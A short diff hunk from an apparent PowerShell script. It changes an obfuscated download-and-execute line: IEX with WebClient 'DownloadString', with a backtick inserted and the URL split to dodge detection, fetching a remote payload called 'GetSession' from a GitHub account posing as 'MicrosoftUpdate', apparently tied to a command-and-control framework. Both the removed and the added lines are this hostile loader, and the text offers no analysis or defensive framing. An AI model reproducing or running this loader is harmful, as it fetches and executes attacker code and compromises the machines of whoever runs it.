@@ -27,6 +27,6 @@ if($id -eq $null) {
 			
 else{
 			
-	IEX (New-Object System.Net.Webclient)."Downloa`dString"('ht'+'tps://raw.githubusercontent.com/MicrosoftUpdate/To_CS/master/GetSession_Win7')
+	IEX (New-Object System.Net.Webclient)."Downloa`dString"('ht'+'tps://raw.githubusercontent.com/MicrosoftUpdate/To_CS/master/GetSession')
 	
 }
